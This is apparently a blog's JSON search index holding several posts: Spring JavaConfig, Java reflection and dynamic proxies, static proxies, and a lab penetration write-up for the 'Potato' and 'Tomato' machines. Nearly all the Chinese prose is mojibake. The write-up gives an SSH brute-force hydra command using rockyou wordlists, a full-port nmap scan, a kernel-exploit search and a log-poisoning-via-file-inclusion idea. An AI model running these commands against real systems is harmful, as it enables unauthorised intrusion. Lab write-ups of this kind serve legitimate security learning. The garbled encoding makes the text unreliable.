ï¼š 1&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; å°†ä¸¤è€…ä¹‹é—´è¿›è¡Œè¿›ä¸€æ­¥çš„å¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é…ç½®ä¸€ä¸ªç±»çš„è¯ï¼š 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;/&gt; è¿™ä¸ªXMLæ ‡ç­¾ç­‰åŒäºï¼š 1234@Beanpublic User user()&#123; return new User();&#125; é‚£å¦‚ä½•æ³¨å…¥å€¼å‘¢ï¼Ÿ åœ¨XMLå½“ä¸­æˆ‘ä»¬æ˜¯è¿™æ ·æ“ä½œçš„ï¼š 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; è€Œåˆ°äº†Javaconfigä¹‹ä¸­ï¼š 123public class User &#123; @Value(&quot;æœˆçŸ³&quot;) public String name; æˆ‘ä»¬é€‰æ‹©ç›´æ¥ç”±ç±»æ¥æ³¨å…¥å€¼ï¼ è€ŒAutowiredä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œè¿˜æ˜¯ç›´æ¥åœ¨åŒ…ä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡çš„ç±»~ï¼Œæ¯”å¦‚æˆ‘ä»¬å°è¯•ç»§ç»­å­¦ä¹ ä¸¾ä¾‹ï¼Œä¸€ä¸ªäººæœ‰ä¸€åªçŒ«å’Œä¸€ä¸ªç‹—: 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;ğŸ±è¯´ï¼šwdnmdb&quot;); &#125;&#125; 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;ğŸ•è¯´ï¼šwndmd&quot;); &#125;&#125; å½“æˆ‘ä»¬ä½¿ç”¨è¿™ç§æ–¹å¼æ¥åˆ›å»ºä¹‹åï¼Œå°±æ²¡æœ‰åœ°æ–¹æ¥ä½¿ç”¨@Componentè¿™ä¸ªæ³¨è§£äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰XMLå‘¢ï¼Ÿ æ€»è€Œè¨€ä¹‹æˆ‘å¿…é¡»ä¸åšå‡ºè¿™æ ·çš„JavaConfigä»£ç ï¼š 123456789101112131415161718@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125; @Bean public Cat cat()&#123; return new Cat(); &#125; @Bean public Dog dog()&#123; return new Dog(); &#125;&#125; è€Œæˆ‘ä»¬çš„@Componentå°±æ²¡æœ‰ä»€ä¹ˆç”¨æ­¦ä¹‹åœ°äº†..","categories":[],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"JavaåŠ¨æ€ä»£ç†","slug":"JavaåŠ¨æ€ä»£ç†","date":"2020-11-10T11:42:16.000Z","updated":"2020-11-10T12:50:37.496Z","comments":true,"path":"2020/11/10/JavaåŠ¨æ€ä»£ç†/","link":"","permalink":"http://example.com/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"JavaåŠ¨æ€ä»£ç†å†å½“å‰çš„Javaä»£ç ä¸­å‡ ä¹éšå¤„å¯è§ï¼Œå› ä¸ºå®ƒæ—¢å¯ä»¥è·å–Javaé™æ€ä»£ç†çš„å¯æ‹“å±•æ€§ï¼Œå¹¶ä¸”å®ƒä¹Ÿå¯ä»¥è®©æˆ‘ä»¬çš„ä»£ç å˜å¾—å¹¶ä¸ç¹çï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ­£æ˜¯ç”±äºJavaçš„åŠ¨æ€ä»£ç†åŸç†æ˜¯åå°„ï¼Œæ•…è¿˜ä¼šå¼•å‡ºå¾ˆå¤šå®‰å…¨é—®é¢˜ï¼Œæˆ‘ä»¬è¦çŸ¥é“ï¼ŒJavaçš„åå°„æœ¬èº«å°±æ˜¯ä¸å®‰å…¨çš„ä¸€ä»¶äº‹ï¼ˆPrivateé¦–å…ˆå°±å˜å¾—æ¯«æ— æ„ä¹‰äº†ï¼‰ è¯è¯´å›æ¥ï¼Œæƒ³è¦å­¦ä¹ å¥½åŠ¨æ€ä»£ç†ï¼Œåå°„çš„å­¦ä¹ æ˜¯å¿…ä¸å¯å…çš„ï¼Œå¦‚æœæ²¡æœ‰å­¦ä¹ è¿‡æˆ‘å»ºè®®å…ˆå­¦ä¹ åå°„ï¼Œè¿™é‡Œå°†ä¸€äº›APIå†™ç½—åˆ—å‡ºæ¥ï¼Œæ–¹ä¾¿æ²¡æœ‰å­¦è¿‡åå°„ï¼Œæˆ–è€…å¯¹åå°„å¹¶ä¸ç†Ÿæ‚‰çš„è¯»è€…å¯ä»¥é˜…è¯»åé¢çš„æ–‡ç«  åå°„APIgetClass[ä¸€ä¸ªå®ä¾‹å¯¹è±¡].getClass ,å°†è¿”å›å®ä¾‹çš„ç±»ï¼Œæˆ‘è¿™é‡Œç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œæ¼”ç¤ºï¼š ä¾‹å­ï¼š 123456789101112131415161718192021222324252627import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass()); &#125;;&#125;class myDemo&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;;&#125; å½“å‰ä»£ç çš„è¾“å‡ºç»“æœä¸ºï¼š æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„å‘ç°ï¼Œè·å–äº†è¯¥å¯¹è±¡ getclass().getInterfaces()å…¶å®æˆ‘ä»¬è¯»åå­—ä¹Ÿå¯ä»¥å¾ˆæ¸…æ¥šçš„æ˜ç™½å®ƒçš„ç”¨é€”äº†ï¼Œç”¨äºè·å–å½“å‰çš„ç»§æ‰¿çš„æ¥å£ 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getInterfaces()); &#125;;&#125;interface bark&#123; void jiao();&#125;class myDemo implements bark&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;; public void jiao() &#123; System.out.println(&quot;jiao&quot;); &#125;&#125; è¿”å›ç»“æœä¸ºï¼š 1[Ljava.lang.Class;@7f31245a è¿™é‡Œä¾¿å¾—åˆ°äº†ç±»çš„æ¥å£äº†ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯ä»¥æµçš„æ–¹å¼è¿›è¡Œä¼ è¾“ getClass().getName()è¿™æ ·çš„ä¹Ÿå¾ˆç®€å•ç†è§£ï¼Œæˆ‘ä»¬å³ä½¿getClassäº†ï¼Œç¨‹åºå´ä¸çŸ¥é“å®ƒçš„åå­—ï¼Œç¨‹åºåªçŸ¥é“æ˜¯ä¸€ä¸ªç±»ï¼Œæ•…æˆ‘ä»¬ä½¿ç”¨getNameå³å¯å¾—åˆ°å½“å‰å®ä¾‹çš„ç±»çš„åå­—ï¼ˆStringå½¢å¼ï¼‰ 1234567public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getName()); &#125;; å¥½åƒå†™ä¸€ä¸ªåŠ¨æ€ä»£ç†ä¹Ÿå°±ç”¨åˆ°äº†è¿™äº›ï¼Œå˜›ï¼Œç»§ç»­å¾€ä¸‹å§ åŠ¨æ€ä»£ç†2.1 æ¥å£é¦–å…ˆå’Œé™æ€ä»£ç†æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦æ„ç­‘ä¸€ä¸ªæ¥å£ï¼š 123456789package myProxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; åŒæ ·çš„ï¼Œä¸šåŠ¡å®ä½“æ˜¯ä¸å¯é¿å…çš„ 2.2å®ä½“ç±»ï¼š12345678910111213141516171819package myProxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;); &#125; public void delete() &#123; System.out.println(&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void update() &#123; System.out.println(&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void query() &#123; System.out.println(&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125;&#125; è€Œä»£ç†ç±»ï¼Œé€šè¿‡åŠ¨æ€ä»£ç†æˆ‘ä»¬å¯ä»¥ç›´æ¥çš„ç”Ÿæˆï¼Œå–æ¶ˆç¹ççš„æ“ä½œ å¦‚æœç”¨é™æ€ä»£ç†ï¼Œæˆ‘ä»¬çš„ä»£ç†æ˜¯è¿™æ ·çš„ï¼š 12345678910111213141516171819202122232425262728293031323334package myProxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;åˆ é™¤&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;æ›´æ–°&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;æŸ¥è¯¢&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]æ‰§è¡Œäº†&quot;+name+&quot;æ–¹æ³•&quot;); &#125;&#125; è€Œä½¿ç”¨åŠ¨æ€ä»£ç†ä¹‹åï¼š 2.3ä»£ç†ç±»123456789101112131415161718192021222324252627282930package Demo3;import myProxy2.UserServiceImp;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler &#123; private UserServiceImp userServiceImp;// IOCï¼Œè®©ç”¨æˆ·è‡ªå®šä¹‰éœ€è¦ä»€ä¹ˆæ¥å£æ¥å†³å®šä»£ç†ç±» public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125;// ç”Ÿæˆä»£ç†ç±» public Object getProxy()&#123; return Proxy.newProxyInstance(this.getClass().getClassLoader(), userServiceImp.getClass().getInterfaces(),this); &#125; // å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; Object result = method.invoke(userServiceImp, args); return result; &#125;&#125; æˆ‘ä»¬å‘ç°ä¸å†éœ€è¦ä¸€ä¸ªä¸€ä¸ªå¥—æ¨¡æ¿å¾€ä¸Šå†™äº†ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å¢æ·»æ–°åŠŸèƒ½ï¼Œåªéœ€è¦è¿™æ ·åšï¼š 1234567891011 // å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; log(method.getName()); Object result = method.invoke(userServiceImp, args); return result; &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]ä½¿ç”¨äº†&quot;+name+&quot;æ–¹æ³•&quot;); &#125;&#125; è™½ç„¶æˆ‘ä»¬å‰é¢å»å†™ç”Ÿæˆä¸€ä¸ªçš„ä»£ç é‡çœ‹ä¼¼å¾ˆå¤§ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™æ®µä»£ç æ˜¯ä¸€ä¸ªå·¥å…·ç”¨çš„ä»£ç ï¼Œæ˜¯å†™æ­»çš„ã€‚ä¸šåŠ¡ä»£ç ç›¸å½“çš„ç«¯ï¼Œä»å‡ åè¡Œéª¤å‡åˆ°åæ¥è¡Œï¼Œå¹¶ä¸”æˆ‘ä»¬çš„ä»£ç†ç±»ä¸ä¼šéšç€å·¥ç¨‹çš„å˜å¤§è€Œå˜å¤§ï¼Œæˆ‘ä»¬é€šè¿‡åå°„ä¹‹åè·å–äº†ç±»çš„æ–¹æ³• è€Œæºç å½“ä¸­ï¼Œinvokeæ–¹æ³•å®é™…ä¸Šä¹Ÿæ˜¯é€šè¿‡setAccessibleæ¥å®ç°çš„","categories":[],"tags":[]},{"title":"é™æ€ä»£ç†","slug":"é™æ€ä»£ç†","date":"2020-11-09T13:36:53.000Z","updated":"2020-11-17T06:15:20.429Z","comments":true,"path":"2020/11/09/é™æ€ä»£ç†/","link":"","permalink":"http://example.com/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"å¥½ä¹…æ²¡ç”¨äº†éƒ½æœ‰ç‚¹å¿˜äº†ï¼Œç°åœ¨æ¡èµ·æ¥å­¦ä¸€ä¸‹ï¼Œä¹‹åè¿˜æœ‰ç”¨ é™æ€ä»£ç†ç»“åˆå‡ºç§Ÿæˆ¿å­ç†è§£ é€šè¿‡å›¾ç¤ºï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸ªä¾‹å­ï¼š å®¢æˆ·éœ€è¦ç§Ÿä¸€ä¸ªæˆ¿å­ æˆ¿ä¸œéœ€è¦ç§Ÿå‡ºæˆ¿å­ è¿™ä¸ªæ—¶å€™ä¸¤è€…ä¹‹é—´çš„åˆåŒå¾ˆçº¯ç²¹ï¼Œå¦‚æœä¸¤è€…è®¤è¯†ï¼Œå°±ä¸éœ€è¦ä¸­ä»‹ï¼Œç›´æ¥å¯¹æ¥æŠŠæˆ¿å­ç§Ÿå‡ºå»å°±å¾ˆç®€å•å¾ˆå¿«äº†å¯¹å§ï¼Ÿä½†æ˜¯ç°å®å¾€å¾€ä¸æ˜¯è¿™æ ·ï¼Œæ›´å¯èƒ½çš„æ˜¯å¦‚ä¸‹æƒ…å†µï¼š æˆ¿ä¸œå’Œå®¢æˆ·äº’ä¸ç›¸è¯†ï¼Œéœ€è¦ç­¾è®¢å„ç§åˆåŒä¿è¯å¯¹æ–¹ä¸ä¼šåæ‚” ä¸€ä¸ªå®¢æˆ·è‚¯å®šä¸ä¼šåªçœ‹æˆ¿å­ï¼Œä»–éœ€è¦çœ‹å¤šä¸ªæˆ¿å­æ¥é€‰æ‹©è‡ªå·±å¿ƒä»ªçš„æˆ¿å­ æˆ¿ä¸œä¸å¯èƒ½æ—¶æ—¶åˆ»åˆ»éƒ½å®ˆç€æˆ¿å­ï¼Œç­‰ä¸€ä¸ªä¸€ä¸ªçš„å®¢æˆ·ä¸Šé—¨æ¥çœ‹ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·çš„éœ€æ±‚å’Œæˆ¿ä¸œçš„å®¢æˆ·éƒ½ç›¸å½“ä¸çº¯ç²¹äº†ï¼Œéœ€è¦ç»è¿‡å¾ˆå¤šæ­¥éª¤æ‰å¯ä»¥è½¬æ¢åˆ°ä½ åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæ­£æ˜¯ç”±äºè¿™ç§æƒ…å†µçš„å‡ºç°ï¼Œæ‰€ä»¥å‡ºç°äº†æˆ¿å±‹ä¸­ä»‹ï¼Œè§£å†³å„ç§å®¢æˆ·çš„æƒ…å†µï¼Œç”±æˆ¿å±‹ä¸­ä»‹æ¥ç»™å®¢æˆ·ä»¬è§£å†³å„ç§é—®é¢˜ï¼Œç»è¿‡ä¸­ä»‹å¤„ç†ï¼ŒåŒæ–¹çš„æƒ…å†µåˆå˜å¾—çº¯ç²¹äº†èµ·æ¥ï¼Œè€Œç¹ççš„äº‹æƒ…äº¤ç»™ä¸­ä»‹æ¥å¤„ç†å³å¯ è€Œä»£ç ä¸€æ ·å¦‚æ­¤ï¼Œè¿™ç§æƒ…å†µçš„å‡ºç°å‡ ä¹å¤„å¤„å¯è§ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯èƒ½éœ€è¦å¤„ç†æ•°æ®åº“ï¼Œä¸­é—´éœ€è¦å¯¹æ•°æ®è¿›è¡Œå„ç§å¤„ç†ï¼Œè¿™ç§æƒ…å†µå°±å’Œä¸Šé¢çš„åˆåŒä¸€æ ·ã€‚ è¯è¯´å›æ¥ï¼Œæˆ‘ä»¬å¦‚ä½•å¤„ç†ç§Ÿæˆ¿å­çš„æƒ…å†µå‘¢ï¼Ÿè¿™é‡Œæˆ‘å†™äº†ä¸€å°æ®µä»£ç æ¥åšå‡ºèŒƒä¾‹ï¼š æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªäº‹æƒ…æŠ½è±¡æˆå››ä¸ªpartï¼š å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ… è°å‡ºç§Ÿï¼Ÿ æˆ¿ä¸œ è°è¦æˆ¿å­ï¼Ÿ å®¢æˆ· è°æ¥å¤„ç†å¤æ‚æƒ…å†µï¼Ÿ ä¸­ä»‹ åˆ†æå®Œä¹‹åæˆ‘ä»¬å¯ä»¥ç€æ‰‹äºä»£ç  å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ…ï¼š 12345package Proxy;public interface Rent &#123; public void rent();&#125; æˆ¿ä¸œ: 12345678package Proxy;public class Host implements Rent&#123; public void rent() &#123; System.out.println(&quot;æˆ¿ä¸œç§Ÿå‡ºæˆ¿å­&quot;); &#125;&#125; ä¸­ä»‹ï¼š 123456789101112131415161718192021222324252627package Proxy;public class MyProxy implements Rent &#123; private Host host; public MyProxy(Host host) &#123; this.host = host; &#125; public void rent() &#123; seeHouse(); host.rent(); takeMoney(); giveMoney(); &#125; public void seeHouse()&#123; System.out.println(&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿å­&quot;); &#125; public void takeMoney()&#123; System.out.println(&quot;ä¸­ä»‹æ”¶ä½ é’±&quot;); &#125; public void giveMoney()&#123; System.out.println(&quot;ä¸­ä»‹ç»™é’±ç»™æˆ¿ä¸œ&quot;); &#125;&#125; å®¢æˆ·ï¼š 123456789101112package Proxy;import org.junit.Test;public class MyTest &#123; @Test public void test1()&#123; MyProxy proxy = new MyProxy(new Host()); proxy.rent(); &#125;&#125; åœ¨ä¸Šé¢çš„ä¾‹å­å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œé™æ€ä»£ç†å¸®æˆ‘ä»¬å®Œæˆäº†å¦‚ä¸‹äº‹æƒ…ï¼š ä½¿å¾—éœ€è¦å†æ¬¡æ˜ç¡®èµ·æ¥ï¼Œæ— è®ºæ˜¯å®¢æˆ·è¿˜æ˜¯æˆ¿ä¸œï¼Œéœ€æ±‚éƒ½å˜å¾—ç›¸å½“ç®€å• å¤æ‚çš„äº‹æƒ…äº¤ç»™äº†ä¸­ä»‹æ¥åš ä½†æ˜¯æˆ‘ä»¬ä¹Ÿå‘ç°äº†ä¸€ä¸ªç¼ºç‚¹ï¼š æˆ‘ä»¬çš„ä»£ç é‡æ˜æ˜¾æå‡äº†å¾ˆå¤šï¼Œç›¸æ¯”äºç›´æ¥æ·»åŠ åŠŸèƒ½ é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœå®¢æˆ·å¾ˆå¤šï¼Œæˆ‘ä»¬ä¸å¾—ä¸æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªä¸ªå®¢æˆ·ï¼Œå·¥ä½œé‡æ›´å¤§äº†ã€‚ ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å­¦ä¹ åˆ°äº†ä»£ç†æ¨¡å¼çš„ç¬¬ä¸€ä¸ªå¥½å¤„ï¼Œæ¥ä¸‹çš„ä¾‹å­å°†è¿›ä¸€æ­¥è¡¨éœ²å‡ºä¸Šé¢çš„è®¾è®¡æ¨¡å¼çš„å¥½å¤„ï¼Œå¹¶ä¸”å®ƒä¼šå±•ç°é™æ€ä»£ç†çš„ç¬¬äºŒä¸ªå¥½å¤„ï¼Œæ·»åŠ æ–°åŠŸèƒ½è€Œä¸ä¿®æ”¹åŸæœ‰ä»£ç  å¢åˆ æ”¹æŸ¥äº‹åŠ¡ï¼š 12345678package Proxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; ä¸šåŠ¡å®ç°ï¼š 12345678910111213141516171819package Proxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;); &#125; public void delete() &#123; System.out.println(&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void update() &#123; System.out.println(&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void query() &#123; System.out.println(&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125;&#125; è¿™æ—¶å€™æˆ‘ä»¬çªç„¶æƒ³è¦æ·»åŠ æ–°åŠŸèƒ½ï¼Œæ‰“å°æˆ‘ä»¬ä½¿ç”¨äº†ä»€ä¹ˆåŠŸèƒ½æ”¹æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¾ˆæ˜æ˜¾å¯ä»¥è¿™æ ·åšï¼š 1234public void query() &#123; System.out.println(&quot;ä½¿ç”¨äº†æŸ¥è¯¢åŠŸèƒ½&quot;); System.out.println(&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ç§æ–¹å¼éå¸¸ç¬¨æ‹™ï¼Œå¹¶ä¸”å¦‚æœæ˜¯æ›´å¤šçš„åŠŸèƒ½ï¼Œç¨‹åºå‘˜å°±å¿…é¡»æ‰‹å†™ï¼Œå¹¶ä¸”ä¸€æ®µä¸€æ®µçš„å¤åˆ¶å·®ä¸å¤šçš„ä»£ç ï¼ï¼ˆè¿™é‡Œå››ä¸ªè¾“å‡ºè¯­å¥å°±è®©æˆ‘æ„Ÿè§‰æœ‰ç‚¹çƒ¦èºäº† æˆ‘ä»¬ç»“åˆä»£ç†æ¨¡å¼ï¼Œå…¶å®å¯ä»¥å¾ˆä¼˜é›…çš„è§£å†³å®ƒï¼š 12345678910111213141516171819202122232425262728293031323334package Proxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;åˆ é™¤&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;æ›´æ–°&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;æŸ¥è¯¢&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]æ‰§è¡Œäº†&quot;+name+&quot;æ–¹æ³•&quot;); &#125;&#125; è¿™æ—¶å€™æˆ‘ä»¬å°±è§£å†³äº†åŠŸèƒ½çš„éœ€æ±‚ï¼Œå¹¶ä¸”ï¼Œæˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹ä»»ä½•ä¸€è¡ŒåŸä»£ç ï¼Œå´ä¸Šçº¿äº†æ–°çš„åŠŸèƒ½ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬çš„ä»£ç æ‹“å±•æ€§ä¾ç„¶å¾ˆé«˜ï¼Œéœ€è¦æ·»åŠ æ–°åŠŸèƒ½åªéœ€è¦æ·»åŠ æ–°çš„ä»£ç†å±‚å³å¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°†å¼•å‡ºäº†ç¬¬ä¸‰ä¸ªæ€æƒ³ï¼š ä»»ä½•åŠŸèƒ½çš„æ·»åŠ ï¼Œä¿®æ”¹ï¼Œå¼•å…¥æ–°çš„ä»£ç†å±‚æ¥è§£å†³ï¼Œå®¢æˆ·åªéœ€è¦å»å¯¼å…¥æœ€åä¸€ä¸ªä»£ç†å¢å³å¯","categories":[],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"Potatoå’ŒTomatoæ¸—é€","slug":"Potatoå’ŒTomatoæ¸—é€","date":"2020-11-08T13:00:22.000Z","updated":"2020-11-17T06:10:18.624Z","comments":true,"path":"2020/11/08/Potatoå’ŒTomatoæ¸—é€/","link":"","permalink":"http://example.com/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/","excerpt":"","text":"Potatoæ¸—é€ä¹Ÿæ˜¯ç»å…¸çš„dirbå’Œnmapæ‰«ä¸€æ³¢ nmapçš„ç»“æœ dirbçš„ç»“æœ ä¹Ÿå°±å‘ç°äº†ä¸€ä¸ªinfo.phpèƒ½ç”¨ï¼Œè®¿é—®ä¸€äº›æ˜¯phpinfoï¼Œå‘ƒï¼Œé‚£å†çœ‹çœ‹nmapï¼Œå¼€äº†7120ç«¯å£ï¼Œçœ‹çœ‹ï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œåªèƒ½é€šè¿‡hypdraè¿›è¡Œçˆ†ç ´å’¯ï¼Œå‘ƒï¼Œè´¦å·å¯†ç éƒ½ä¸çŸ¥é“ï¼Œåªèƒ½è¯•è¯•çœ‹äº† 1hydra 192.168.1.113 ssh -s 7120 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f ç™»é™†ä¸Šä¹‹åæŸ¥çœ‹uname -a æŸ¥çœ‹èƒ½ä¸èƒ½ææƒ çœ‹è§å†…æ ¸ä¸ºubuntu3.å¤šï¼Œè¿™ç§è€ç‰ˆæœ¬ä¸€èˆ¬å¯ä»¥ç›´æ¥æï¼Œå°è¯•æœç´¢ 123potato@ubuntu:/tmp$ uname -aLinux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux searchsploit Ubuntu 3.13.0 åˆ©ç”¨-pæŒ‡ä»¤æ‰¾åˆ°å­˜æ”¾ä½ç½®ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‹¿ä¸‹expäº†ï¼Œå†ä¸Šä¼ åˆ°é¶æœºçš„tmpç›®å½•ä¸‹ï¼ˆå› ä¸ºtmpç›®å½•å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯777æƒé™ æˆåŠŸæ‹¿ä¸‹ï¼ Tomatoæ¸—é€é¦–å…ˆç»å…¸dribå’Œnmapæ‰«ä¸€æ³¢ nmapï¼š 1nmap -sS -v -T4 -Pn -A -p 0-65535 å‘ç°8888ç«¯å£å’Œ21ï¼Œå¼€äº†å…¶ä»–tcpå’Œsshçš„ç«¯å£,ä½†æ˜¯éƒ½æ²¡æ³•ç”¨ï¼Œåœ¨info.phpä¸‹å‘ç°æ–‡ä»¶åŒ…å« å°è¯•åŒ…å«äº†ä¸€ä¸‹etc/passwdå°±å¡ä½äº†ï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆåšã€‚ã€‚ è¿™é‡Œè®°å½•ä¸‹å„ä¸ªlogçš„æ–‡ä»¶ 1234567891011121314151617189)/var/run/utmp è®°å½•ç€ç°åœ¨ç™»å½•çš„ç”¨æˆ·;10)/var/log/lastlog è®°å½•æ¯ä¸ªç”¨æˆ·æœ€åçš„ç™»å½•ä¿¡æ¯;11)/var/log/btmp è®°å½•é”™è¯¯çš„ç™»å½•å°è¯•;12)/var/log/dmesgå†…æ ¸æ—¥å¿—;13)/var/log/cpus CPUçš„å¤„ç†ä¿¡æ¯ï¼›14)/var/log/syslog äº‹ä»¶è®°å½•ç›‘æ§ç¨‹åºæ—¥å¿—ï¼›15)/var/log/auth.log ç”¨æˆ·è®¤è¯æ—¥å¿—ï¼›16)/var/log/daemon.log ç³»ç»Ÿè¿›ç¨‹æ—¥å¿—ï¼›17)/var/log/mail.err é‚®ä»¶é”™è¯¯ä¿¡æ¯ï¼›18)/var/log/mail.info é‚®ä»¶ä¿¡æ¯ï¼›19)/var/log/mail.warn é‚®ä»¶è­¦å‘Šä¿¡æ¯ï¼›20)/var/log/daemon.log ç³»ç»Ÿç›‘æ§ç¨‹åºäº§ç”Ÿçš„ä¿¡æ¯;21)/var/log/kern å†…æ ¸äº§ç”Ÿçš„ä¿¡æ¯;22)/var/log/lpr è¡Œæ‰“å°æœºå‡è„±æœºç³»ç»Ÿäº§ç”Ÿçš„ä¿¡æ¯; æ ¹æ®å¤§ä½¬çš„payloadï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„logæ–‡ä»¶åªæœ‰auth.log,å› ä¸ºåªæœ‰ä¸ªè¿™ä¸ªæ—¥å¿—æˆ‘ä»¬å¯ä»¥æ“ä½œï¼Œæ¯”å¦‚æˆ‘ä»¬å†™å…¥ä¸€å¥è¯ï¼Œå†è¿›è¡ŒåŒ…å«çš„è¯ï¼Œä¸å°±æ˜¯æ‰§è¡Œäº†å‘½ä»¤äº†å—ï¼ˆè¿™ä¸ªæ€è·¯çœŸçš„éªš 